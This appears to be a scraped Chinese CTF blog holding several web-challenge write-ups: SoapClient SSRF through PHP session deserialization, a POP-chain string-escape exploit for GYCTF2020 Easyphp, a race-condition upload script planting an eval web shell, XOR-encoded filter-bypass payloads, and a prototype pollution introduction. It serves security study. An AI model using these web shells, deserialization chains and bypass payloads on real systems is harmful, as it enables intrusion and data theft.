localhost can get flag! 他需要loalhost访问，那基本是SSRF的题目了，接下来就寻找一下如何突破: &lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) { $_SESSION['name'] = $_GET['name'];}var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a);?&gt; array(0) {} 我们可以看到这里输出的唯一内容是session，所以我们需要从session进行入手。session通过修改存储机制可以进行反序列化：而session正好有可以修改配置文件的函数session_start()eg： &lt;?php// 设置 cookie 的有效时间为 1 天session_start([ 'cookie_lifetime' =&gt; 86400,]);?&gt; 通过调用soapclient类就可以实现修改访问的ip了soapclient内置类的开启需要在php.ini中进行配置 接下来就是构造payload，先通过一个简单的实例，通过构造这样的一个类，可以实现发送到服务端地址的改变：这是php手册中关于soapclient类的construct构造的定义https://www.php.net/manual/zh/soapclient.construct.php 如果在 WSDL 模式下工作，则此参数是可选的。如果在非 WSDL 模式下工作，则必须设置location和 uri选项，其中location 是将请求发送到的 SOAP 服务器的 URL,是 SOAP 服务uri 的目标名称空间。 &lt;?php$a=new SoapClient(null,array('location'=&gt;&quot;http://127.0.0.1/flag.php&quot;,&quot;uri&quot;=&gt;&quot;http://127.0.0.1/&quot;,'user_agent' =&gt; &quot;a:c\\r\\n&quot; .&quot;Cookie:PHPSESSID=1&quot;,));//这个uri没有强制指定，所以都可以echo(urlencode(serialize($a))); 好的基本信息大概都清楚了，接下来就是如何利用题目中的函数实现，首先我们先用php_serialize存储机制存入SoapClient，首先构造一下我们需要反序列化的soap类， &lt;?php$a=new SoapClient(null,array('location'=&gt;&quot;http://127.0.0.1/flag.php&quot;,&quot;uri&quot;=&gt;&quot;http://test-uri/&quot;,&quot;Cookie:PHPSESSID=i9n0hbcqn1vmhnpdnterckj8h0&quot;))//这个uri没有强制指定，所以都可以,PHPsessid需要设置不然访问不到echo urlencode(serialize($a)); call_user_func()把第一个参数作为回调函数调用,其他参数是回调函数的参数 成功写入 接下里进行改内容的反序列化调用，由于soap的ssrf是需要调用_call方法的，所以这里我们要想想如何调用什么不存在的类和方法=-=，可想而知 就是这里的welcome_to…..，具体的运作逻辑如下 几个函数补充了解一下： 题目中接下来的代码运作是：首先reset将数组的内部指针指向第一个单元也就是SoapClient，然后将welcome_..也合并在这个数组当中 最后再使用implode将这个数组转化为字符串，但其中都没有触发过这个soap的__call方法这里我们可以将变量b覆盖为call_user_func,令其在最后调用执行SoapClient，但是传入的b会被写入为数组形式，所以我们还需要一个函数将其释放出来，就是extract()它的主要作用是将数组展开，键名作为变量名，元素值为变量值 所以payload如下: 访问session=1（刚刚设置的） 小结：1.session反序列化机制主要是利用session存储机制不同所造成的的漏洞2.判别标准是：session是否开启，session_start函数是否可以被调用，是否存在多余参数可以用来控制session_handler。3.可以利用soap内置类实现ssrf 1'ununionion selselectect '&lt;?php eval($_POST[a]);?&gt;' INintoTO OUToutfileFILE '/var/www/html/1.php'#","link":"/2021/07/20/lctf-babyphp-s-revenge/"},{"title":"GYCTF2020-Easyphp","text":"[GYCTF2020]Easyphpwww.zip备份文件下载下来审计一下~有点好笑哈哈哈哈哈哈~ 在lib.php中看到很多类和方法，盲猜就是需要反序列化，然后搜索了一下unserialize函数发现在update函数中果然有这个函数。但是没看到传参的入口，于是再看看其他文件，发现：包含了flag.php，回想到刚刚看到的file_get_contents~这不就呼应上了？不过还是要再继续看看，别等下走了歪路。。。 回到update.php中，我们可以发现，即使login!=1依旧会执行$users-&gt;update();，而这个函数在lib.php中，反序列化了getNewinfo()中的内容继续看getNewInfo()里面的内容，可以使用post传入age和nickname，实现参数的传入但是由于有个safe函数，所以我们直接通过file_get_contents包含是不太可能的==于是想想有没有其他，可以发现这个safe函数，他是通过将危险字符串换成hacker来达到过滤的目的，这样的话就意味着存在反序列化字符串逃逸的的风险继续查看一下他的整体代码逻辑，不难发现nickname和age会被插入在这里执行update操作：我们的最终目标应该是修改admin的密码，使得我们可以登录，所以这里的update语句似乎也没有多大意义的亚子，于是我们看看其他地方能不能构造出一条链出来,如果我们可以是用login方法，它会创造一个新的类也就是dbCtrl，接下来就会执行查询的sql语句，但是查询结果似乎是只有回显id，我们需要的是密码，所以好像意义不太大？，继续往下看看 在user里面还有一个tostring，通常是用来做跳板的：当一个类被转换成字符串时被调用，update函数也是User里面的，所以应该是其他地方的跳回来这里吧，继续往下 这是一个新的类，其中有一个call方法，即调用不可访问或不存在的方法时被调用，一般也是用来做跳板的，他最后是login的，login就两个地方，一个是dbCtrl，一个是User，要去哪个呢？，感觉应该是要去dbCtrl，为什么呢，继续往下看看 这边echo了sql，应该是echo查询结果吧，echo输出的内容是字符串，所以应该是从这里开始起跳到User里面， 整理一下思路，从UpdateHelper中构造查询sql语句然后通过destruct将nickname赋值为Info类，调用info里面的call方法，并将ctrlcase赋值为dbCtrl使其使用login方法查询sql结果， 构造一下在本地调试一波看看 &lt;?phperror_reporting(0);session_start();function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\\\',&quot;*&quot;,&quot;alter&quot;); return str_replace($array,'hacker',$parm);}class User{ public $id; public $age=null; public $nickname=null; public function login() { } public function update(){ } public function getNewInfo(){ } public function __destruct(){ } public function __toString() { $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; }}class Info{ public $CtrlCase; public function __construct(){ } public function __call($name,$argument){ echo $this-&gt;CtrlCase-&gt;login($argument[0]); }}Class UpdateHelper{ public $sql; public function __construct(){ } public function __destruct() { echo $this-&gt;sql; }}class dbCtrl{ public $hostname=&quot;localhost&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;as119801222&quot;; public $database=&quot;security&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() { $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; } public function login($sql) { $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) { die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); } $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') { return $idResult; } if (!$idResult) { echo('用户不存在!'); return false; } if (md5($this-&gt;password)!==$passwordResult) { echo('密码错误！'); return false; } $_SESSION['token']=$this-&gt;name; return $idResult; } public function update($sql) { //还没来得及写 }}$a=new UpdateHelper();$b=new User();$c=new Info();$d=new dbCtrl();$b-&gt;age=&quot;select password from users where username='admin'&quot;;$c-&gt;CtrlCase=$d;$b-&gt;nickname=$c;$a-&gt;sql=$b;echo (serialize($a));unserialize(&quot;O:12:\\&quot;UpdateHelper\\&quot;:1:{s:3:\\&quot;sql\\&quot;;O:4:\\&quot;User\\&quot;:3:{s:2:\\&quot;id\\&quot;;N;s:3:\\&quot;age\\&quot;;s:49:\\&quot;select password from users where username='admin'\\&quot;;s:8:\\&quot;nickname\\&quot;;O:4:\\&quot;Info\\&quot;:1:{s:8:\\&quot;CtrlCase\\&quot;;O:6:\\&quot;dbCtrl\\&quot;:8:{s:8:\\&quot;hostname\\&quot;;s:9:\\&quot;localhost\\&quot;;s:6:\\&quot;dbuser\\&quot;;s:4:\\&quot;root\\&quot;;s:6:\\&quot;dbpass\\&quot;;s:11:\\&quot;as119801222\\&quot;;s:8:\\&quot;database\\&quot;;s:8:\\&quot;security\\&quot;;s:4:\\&quot;name\\&quot;;N;s:8:\\&quot;password\\&quot;;N;s:6:\\&quot;mysqli\\&quot;;N;s:5:\\&quot;token\\&quot;;N;}}}}&quot;); 调试完以后是按照想象中的跳了，但是没出来密码？所以想说再构造一下试试看，试了几次都没出密码，于是看了一下wp，发现几件事，首先，idresult对应的是查询出来的第一个参数，所以我们的查询语句应该是select password,id from users where username=？ 其次 查询的对象也就是name的赋值需要在这里赋值: 所以改良以后的poc为: &lt;?phperror_reporting(0);session_start();function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\\\',&quot;*&quot;,&quot;alter&quot;); return str_replace($array,'hacker',$parm);}class User{ public $id; public $age=null; public $nickname=null; public function login() { } public function update(){ } public function getNewInfo(){ } public function __destruct(){ } public function __toString() { $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; }}class Info{ public $CtrlCase; public function __construct(){ } public function __call($name,$argument){ echo $this-&gt;CtrlCase-&gt;login($argument[0]); }}Class UpdateHelper{ public $sql; public function __construct(){ } public function __destruct() { echo $this-&gt;sql; }}class dbCtrl{ public $hostname=&quot;localhost&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;as119801222&quot;; public $database=&quot;security&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() { $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; } public function login($sql) { $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) { die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); } $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') { return $idResult; } if (!$idResult) { echo('用户不存在!'); return false; } if (md5($this-&gt;password)!==$passwordResult) { echo('密码错误！'); return false; } $_SESSION['token']=$this-&gt;name; return $idResult; } public function update($sql) { //还没来得及写 }}$a=new UpdateHelper();$b=new User();$c=new Info();$d=new dbCtrl();$d-&gt;token='admin';$d-&gt;name='admin';$b-&gt;age=&quot;select password,id from users where username=?&quot;;$c-&gt;CtrlCase=$d;$b-&gt;nickname=$c;$a-&gt;sql=$b;#echo (serialize($a));unserialize(&quot;O:12:\\&quot;UpdateHelper\\&quot;:1:{s:3:\\&quot;sql\\&quot;;O:4:\\&quot;User\\&quot;:3:{s:2:\\&quot;id\\&quot;;N;s:3:\\&quot;age\\&quot;;s:52:\\&quot;select password,id from users where username='admin'\\&quot;;s:8:\\&quot;nickname\\&quot;;O:4:\\&quot;Info\\&quot;:1:{s:8:\\&quot;CtrlCase\\&quot;;O:6:\\&quot;dbCtrl\\&quot;:8:{s:8:\\&quot;hostname\\&quot;;s:9:\\&quot;localhost\\&quot;;s:6:\\&quot;dbuser\\&quot;;s:4:\\&quot;root\\&quot;;s:6:\\&quot;dbpass\\&quot;;s:11:\\&quot;as119801222\\&quot;;s:8:\\&quot;database\\&quot;;s:8:\\&quot;security\\&quot;;s:4:\\&quot;name\\&quot;;s:5:\\&quot;admin\\&quot;;s:8:\\&quot;password\\&quot;;N;s:6:\\&quot;mysqli\\&quot;;N;s:5:\\&quot;token\\&quot;;s:5:\\&quot;admin\\&quot;;}}}}&quot;); 由于以上的poc我连接的是本地的数据库来测试，所以后面需要改回去接下来就是让这里的反序列化内容逃逸出去这里说一下遇到的坑：1.记得前面的内容要有引号闭合，后面要有花括号闭合2.原本的反序列化内容还有个CtrlCase，我们的payload拼接进去以后会被挤到后面去就被丢掉了，所以需要在我们的payload之前加一下（在这里卡了很久无语了） 这是终极payload： &lt;?phperror_reporting(0);session_start();function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\\\',&quot;*&quot;,&quot;alter&quot;); return str_replace($array,'hacker',$parm);}class User{ public $id; public $age=null; public $nickname=null; public function login() { } public function update(){ } public function getNewInfo(){ $age=&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\\&quot;;O:12:\\\\\\&quot;UpdateHelper\\\\\\&quot;:1:{s:3:\\\\\\&quot;sql\\\\\\&quot;;O:4:\\\\\\&quot;User\\\\\\&quot;:3:{s:2:\\\\\\&quot;id\\\\\\&quot;;N;s:3:\\\\\\&quot;age\\\\\\&quot;;s:52:\\\\\\&quot;select password,id from users where username = 'admin'\\\\\\&quot;;s:8:\\\\\\&quot;nickname\\\\\\&quot;;O:4:\\\\\\&quot;Info\\\\\\&quot;:1:{s:8:\\\\\\&quot;CtrlCase\\\\\\&quot;;O:6:\\\\\\&quot;dbCtrl\\\\\\&quot;:8:{s:8:\\\\\\&quot;hostname\\\\\\&quot;;s:9:\\\\\\&quot;localhost\\\\\\&quot;;s:6:\\\\\\&quot;dbuser\\\\\\&quot;;s:4:\\\\\\&quot;root\\\\\\&quot;;s:6:\\\\\\&quot;dbpass\\\\\\&quot;;s:11:\\\\\\&quot;as119801222\\\\\\&quot;;s:8:\\\\\\&quot;database\\\\\\&quot;;s:8:\\\\\\&quot;security\\\\\\&quot;;s:4:\\\\\\&quot;name\\\\\\&quot;;s:5:\\\\\\&quot;admin\\\\\\&quot;;s:8:\\\\\\&quot;password\\\\\\&quot;;N;s:6:\\\\\\&quot;mysqli\\\\\\&quot;;N;s:5:\\\\\\&quot;token\\\\\\&quot;;s:5:\\\\\\&quot;admin\\\\\\&quot;;}}}}&quot;; $nickname=&quot;11&quot;; return safe(serialize(new Info($age,$nickname))); } public function __destruct(){ } public function __toString() { $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; }}class Info{ public $age; public $CtrlCase; public function __construct(){// $this-&gt;age=$age;// $this-&gt;nickname=$nickname; } public function __call($name,$argument){ echo $this-&gt;CtrlCase-&gt;login($argument[0]); }}Class UpdateHelper{ public $sql; public function __construct(){ } public function __destruct() { echo $this-&gt;sql; }}class dbCtrl{ public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() { $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; } public function login($sql) { $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) { die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); } $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') { return $idResult; } if (!$idResult) { echo('用户不存在!'); return false; } if (md5($this-&gt;password)!==$passwordResult) { echo('密码错误！'); return false; } $_SESSION['token']=$this-&gt;name; return $idResult; } public function update($sql) { //还没来得及写 }}$a=new UpdateHelper();$b=new User();$c=new Info();$d=new dbCtrl();$d-&gt;token='admin';$d-&gt;name='admin';$b-&gt;age=&quot;select password,id from users where username=?&quot;;$c-&gt;CtrlCase=$d;$b-&gt;nickname=$c;$a-&gt;sql=$b;echo (&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\\&quot;;s:8:\\&quot;CtrlCase\\&quot;;&quot;);echo (serialize($a)); 在本地调试是可以的==但是不知道为啥放到题目下就不行了，我人傻了 可以看到因为数据库的账号密码不匹配所以返回了错误信息。 我以为是我的payload出了问题，但是直接复制粘贴别人的也没有可以的–无语了 loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:46:&quot;select password,id from users where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:{s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}} 后来感觉还是很不甘心，于是又去找了一下其他人的payload，发现有一个人的可以用，可是s:2:”as”;这个部分从哪里来的属实没懂找了好几个师傅的题解都没看到 loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload&quot;;s:2:&quot;as&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:46:&quot;select password,id from users where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:{s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}} 而且在本地运行的时候就运行不来，盲猜是题目没配置好吧？越想越不合理，又重新尝试了一下，发现我那个又可以了，但是本地却不行了,于是再尝试了一下，发现二者之间相差两个字符，也就是本地能成功的，只要拿掉一个load，也就是扣掉两个字符在题目环境下就能成功。而且很无语的是扣掉两个花括号也能成功==，无语了 小结完整做下来以后还是收获了很多，主要是有很多小坑，当代码读完一遍吼，反序列pop链的构造其实并没有很困难，就是那几个魔术方法运用一下就型，顺着思路走就行。坑点主要就是上面那几个，说说学到了啥1.学到了很多调试方案，当我拼接以后一直尝试不出来的时候，对那串反序列化一个部分一个部分进行调试，才发现需要保证其完整性2.那个s从哪里来的真的把我搞懵了==用题目下下来的源码去跑这个payload是出不来东西的，用原本的才行，而在题目的环境中却又必须要用那个玩意？？ https://www.1ight.top/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb/#comment-9","link":"/2021/07/18/GYCTF2020-Easyphp/"},{"title":"buu23","text":"[RoarCTF 2019]Simple Upload开头源码 &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller{ public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), &quot;.php&quot;) ) { return false; } $upload = new \\Think\\Upload();// 实例化上传类 $upload-&gt;maxSize = 4096 ;// 设置附件上传大小 $upload-&gt;allowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 $upload-&gt;rootPath = './Public/Uploads/';// 设置附件上传目录 $upload-&gt;savePath = '';// 设置附件上传子目录 $info = $upload-&gt;upload() ; if(!$info) {// 上传错误提示错误信息 $this-&gt;error($upload-&gt;getError()); return; }else{// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1)); } }} 尝试了一下其他后缀名上传，发现无法被解析成功，所以看到这个upload()函数，以及对应的防护机制，猜测可以使用条件竞争绕过，写先一下脚本 thinkphp默认上传路径为：/home/index/upload所以有 import requestsurl=&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/index.php/home/index/upload&quot;s=requests.session()files={'file':(&quot;1.txt&quot;,&quot;&quot;)}files1={'file':(&quot;1.php&quot;,&quot;&lt;?php eval($_GET['a']); ?&gt;)&quot;)}r=s.post(url,files=files).textprint(r)r=s.post(url,files=files1).textprint(r)r=s.post(url,files=files).textprint(r) {&quot;url&quot;:&quot;\\/Public\\/Uploads\\/2021-07-24\\/60fbd50e4d0f4.txt&quot;,&quot;success&quot;:1}{&quot;url&quot;:&quot;\\/Public\\/Uploads\\/&quot;,&quot;success&quot;:1}{&quot;url&quot;:&quot;\\/Public\\/Uploads\\/2021-07-24\\/60fbd50e61127.txt&quot;,&quot;success&quot;:1} 接下来就是去爆破一下这个文件名 60fbd50e6112760fbd50e4d0f4 import requestsurl=&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/Public/Uploads/2021-07-24/&quot;# files={'file':(&quot;1.txt&quot;,&quot;&quot;)}# files1={'file[]':(&quot;1.php&quot;,&quot;&lt;?php eval($_GET['a']); ?&gt;)&quot;)}# r=s.post(url,files=files).text# print(r)# r=s.post(url,files=files1).text# print(r)# r=s.post(url,files=files).text# print(r)str='0123456789abcdef'for i in str: for j in str: for f in str: for k in str: for o in str: url_fina=url+f&quot;60fbd50e{i}{j}{f}{k}{o}.php&quot; try: r=requests.get(url,timeout=1) except: continue if r.status_code!=404: print(url_fina) break 但是现在buu的防止太多请求太严了–一直跑不出来 [HarekazeCTF2019]Avatar Uploader 1忘保存了，没了很难受，大概就是照一张256像素一下的图片，然后将图片内容改为这一行因为那两个解析函数的解析方式在这里不同 [ISITDTU 2019]EasyPHP&lt;?phphighlight_file(__FILE__);$_ = @$_GET['_'];if ( preg_match('/[\\x00- 0-9\\'&quot;`$&amp;.,|[{_defgops\\x7F]+/i', $_) ) die('rosé will not do it');if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die('you are so close, omg');eval($_);?&gt; 正则进行匹配过滤，匹配00到空格()的字符，0到9的数字、&quot;$&amp;.,|[{_defgops以及DEL（7f）字符。如果你提交的字符串出现上述字符，die。第二个if表示我们提交的字符串一共不能出现多于13种不同的字符使用此网站可以进行正则匹配的调试https://regex101.com/所以它允许出现的字符可以如下 !#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz}~ 我们后面的eval肯定是要执行函数的，所以我们可以fuzz一下哪些函数没被过滤，从而来看看有没有实现rce的可能,用php写个脚本 &lt;?php$array=get_defined_functions();foreach($array['internal'] as $arr){ if(preg_match('/[\\x00- 0-9\\'&quot;\\`$&amp;.,|[{_defgops\\x7F]+/i',$arr))continue; if(strlen(count_chars(strtolower($arr),0x3))&gt;0xd)continue; var_dump($arr.'&lt;br/&gt;')} 但是得到的函数却和读取文件啥的没有关系–，所以继续往下看看其实以前也做过很多这种类似题特征是1.过滤了很多字符2.有些运算字符没有被过滤那么这就意味着我们可以通过运算来取字符，比如说^运算然后去构造我们需要的字符payloadtest: (%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();//分号和括号是因为这个要放到eval里面执行，是必不可少的语法要求 接下来看看这个配置里面有什么能用的信息不首先disable_function中的函数有很多都被禁了，然后它可以访问的目录也只限制在/html目录下，那么根据以往的经验，大概是要scandir等函数看一下当前目录下的内容了我们构造一下语句然后去找一下字符 print_r(scandir('.')); 还是之前的那个脚本 import urllib.parsefind = ['p','r','i','_','n','t','s','c','a','d','r','.']for i in range(0,256): for j in range(0,256): result=chr(i^j) if(result in find): a= i.to_bytes(1,byteorder='little') b= j.to_bytes(1,byteorder='little') #print(a,b) a= urllib.parse.quote(a) b= urllib.parse.quote(b) print(&quot;%s:%s^%s&quot;%(result,a,b)) 但是这样运算出来的字符我们随便选取就会大于十三个了，要绕过这个，我们就要想想看如何缩减？ ((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 其实运用一种套娃的思想即可，这些字符里面的字符肯定可以由其他字符再异或构成的，所以我们这里就将所有异或字符先列出，想在上面的代码进行改编一下，直接一步到位但是我发现似乎不太行。还不如我直接取完再送进去对每个字符重新异或 result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c] # Original chars,11 totalresult = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c] # to be deletedtemp = []for d in result2: for a in result: for b in result: for c in result: if (a ^ b ^ c == d): if a == b == c == d: continue else: print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d)) if d not in temp: temp.append(d)print(len(temp), temp) 对结果进行整理一下，发现： ((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 拿到flag所在文件。最后构造一下，因为flag在最后一个位置，所以可以直接用end进行获取 ((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));","link":"/2021/07/24/buu23/"},{"title":"GYCTF2020-Ez_Express","text":"[GYCTF2020]Ez_Express前言看了一下有注册有登录，于是试了一下www.zip发现有源码泄露：审计的是thinkphp6.0，看半天看不出个所以然，于是看wp了 js原型链污染原型链特性：当我们调用一个对象的某属性时 1.对象（obj）中寻找这一属性2.如果找不到，则在obj.proto中寻找属性3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性 以上机制被称为js的prototype的继承链。和node.js沙盒逃逸的原理似乎是一样的举例： function Foo() { this.bar = 1}Foo.prototype.show = function show() { console.log(this.bar)}let foo = new Foo()foo.show() 理解：Foo是一个类，prototype是Foo的属性，Foo中所有的实例化后对象都将拥有这个属性，我们在prototype属性中定义了一个方法show，接下来所有实例化后的对象如foo都将直接拥有foo方法。原型链污染定义: 如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染 例： let foo={bar:1}//foo是一个对象console.log(foo.bar)//foo.bar此时为1foo.__proto__.bar=2//foo的原型设一个bar值为2console.log(foo.bar)//输出为1，因为foo的bar已经为1let zoo={}//设zoo的对象为空console.log(zoo.bar)//这个时候zoo的bar就为2，现在每个原型都有个属性bar值为2 